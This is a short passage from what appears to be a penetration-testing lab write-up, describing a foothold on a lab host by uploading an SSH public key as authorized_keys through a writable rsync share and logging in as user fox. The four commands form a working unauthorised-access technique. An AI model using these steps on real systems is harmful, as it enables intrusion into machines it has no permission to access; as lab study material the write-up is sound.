### ++ System Interaction ++
#### Foothold  
	* With Hacktricks info we found that we have a share called fox (it's the name of the user) and we can upload files, so we build a ssh key and move the 'authorized_keys' file. Then we login with ssh and our key file and we land as fox
		ssh-keygen -f mykey
		mv mykey.pub authorized_keys
		rsync -av .ssh rsync://192.168.195.126/fox/
		ssh fox@192.168.195.126 -i .ssh/mykey
